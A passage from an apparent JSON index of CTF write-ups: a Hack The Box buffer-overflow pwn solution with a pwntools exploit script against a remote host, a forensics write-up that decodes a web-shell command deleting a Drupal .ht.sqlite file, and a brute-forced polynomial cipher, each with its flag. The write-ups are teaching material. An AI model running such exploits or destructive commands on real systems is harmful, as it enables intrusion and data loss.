&quot;\\n[!] After some investigation, you found a secret camera inside the snowman!\\n\\n1.Deactivate ⚠\\xfe0f\\n2. Break it 🔨\\n&amp;gt; &quot; ); fflush(stdout); read(0,local_48,0x108); iVar1 = atoi(local_48); if (iVar1 == 1) { puts(&quot;\\x1b[1;31m&quot;); printstr(&quot;[!] You do not know the password!\\n[-] Mission failed!\\n&quot;); /* WARNING: Subroutine does not return */ exit(0x16); } iVar1 = atoi(local_48); if (iVar1 == 2) { puts(&quot;\\x1b[1;31m&quot;); printstr( &quot;[!] This metal seems unbreakable, the elves seem to have put a spell on it..\\n[-]Mission failed!\\n&quot; ); /* WARNING: Subroutine does not return */ exit(0x16); } fflush(stdout); puts(&quot;\\x1b[1;31m&quot;); fflush(stdout); puts(&quot;[-] Mission failed!&quot;); fflush(stdout); return;}There’s another function named deactivate cameravoid deactivate_camera(void){ char acStack104 [48]; FILE *local_38; char *local_30; undefined8 local_28; int local_1c; local_1c = 0x30; local_28 = 0x2f; local_30 = acStack104; local_38 = fopen(&quot;flag.txt&quot;,&quot;rb&quot;); if (local_38 == (FILE *)0x0) { fwrite(&quot;[-] Could not open flag.txt, please conctact an Administrator.\\n&quot;,1,0x3f,stdout); /* WARNING: Subroutine does not return */ exit(-0x45); } fgets(local_30,local_1c,local_38); puts(&quot;\\x1b[1;32m&quot;); fwrite(&quot;[+] Here is the secret password to deactivate the camera: &quot;,1,0x3a,stdout); puts(local_30); fclose(local_38); return;}Overflow So we basically have to find the offset in investigation function, overflow it and set the $rip ( Instruction pointter ) to deactivate_camera function Find OFFSET Set breakpoint at exit in investigate() [ address of exit : 0x00000000004013ea ] and create a pattern to find offset Run the program , give option 1 to go in investigate function This is how stack will look when we hit our breakpoint So the OFFSET is 72Exploit Send buffer of 72 characters Add the addresss of deactivate camera function Send the payload and get the flagSolve.pyfrom pwn import *# nc 134.209.30.250:30947p = remote(&#39;134.209.30.250&#39;,30947)payload = b&#39;A&#39;*72payload += p64(0x00401165)p.recv()p.sendline(b&#39;1&#39;)p.recv()p.sendline(payload)p.interactive()Flag# Flag : HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}baby APT [ Forensics ]Note This is unintended way to do the challengeSolution Strings command showed some HTTP requets URL encodedcmd=rm++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles%2F.ht.sqlite+%26%26+echo+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59+%3E+%2Fdev%2Fnull+2%3E%261+%26%26+ls+-al++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles URL decodedcmd=rm /var/www/html/sites/default/files/.ht.sqlite &amp;amp;&amp;amp; echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; ls -al /var/www/html/sites/default/filesFlag└─$ echo &quot;SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59&quot; | base64 -d HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}" }, { "title": "Akahack easy Crypto", "url": "/posts/Akahack/", "categories": "ctf", "tags": "ctf", "date": "2022-01-16 01:30:00 +0530", "snippet": "Challenge Files:Scriptdef my_function(x): return pow(x,3)+10*pow(x,2)+x*7 + 6plaintext = &quot;&amp;lt;censored&amp;gt;&quot;cipher = []for i in plaintext : cipher.append(my_function(ord(i)))print(&quot;cipher = &quot; ,cipher)Outputcipher = [317336, 1696274, 425598, 1007448, 1069008, 1340288, 346128, 663858, 392496, 2013024, 734808, 1233758, 1268616, 1069008, 1233758, 948296, 142008, 1653936, 948296, 516368, 133974, 1612308, 1133024, 948296, 392496, 1739328, 1452776, 948296, 641264, 133974, 497274, 1783104, 1268616, 1452776, 1199544, 948296, 1531158, 133974, 1377114, 1918824, 1452776, 133974, 1414608, 1268616, 1007448, 1377114, 1653936, 948296, 556008, 619188, 948296, 1037924, 619188, 1739328, 1696274, 1133024, 392496, 133974, 1612308, 1069008, 1268616, 1452776, 1199544, 290184, 47064, 2110256]Solution So the line return pow(x,3)+10*pow(x,2)+x*7 + 6 takes a char from plaintext and performs some maths to encode the character Each character goes in for loop for i in plaintext : cipher.append(my_function(ord(i))) As each character of the flag goes inside the function, let’s make a variable that has every possible character the flag will have plaintext = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_1234567890!@#$%^&amp;amp;*()&quot; Solve.pydef my(x): return pow(x,3)+10*pow(x,2)+x*7 + 6plaintext = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_1234567890!@#$%^&amp;amp;*()&quot;cipher = [317336, 1696274, 425598, 1007448, 1069008, 1340288, 346128, 663858, 392496, 2013024, 734808, 1233758, 1268616, 1069008, 1233758, 948296, 142008, 1653936, 948296, 516368, 133974, 1612308, 1133024, 948296, 392496, 1739328, 1452776, 948296, 641264, 133974, 497274, 1783104, 1268616, 1452776, 1199544, 948296, 1531158, 133974, 1377114, 1918824, 1452776, 133974, 1414608, 1268616, 1007448, 1377114, 1653936, 948296, 556008, 619188, 948296, 1037924, 619188, 1739328, 1696274, 1133024, 392496, 133974, 1612308, 1069008, 1268616, 1452776, 1199544, 290184, 47064, 2110256]for i in cipher: for j in plaintext: if my(ord(j)) == i: print(j,end=&#39;&#39;)#flag : AtHackCTF{Which_1s_M0re_Fun_S0Lving_p0lyn0mials_OR_bRuteF0rcing!} " } ]
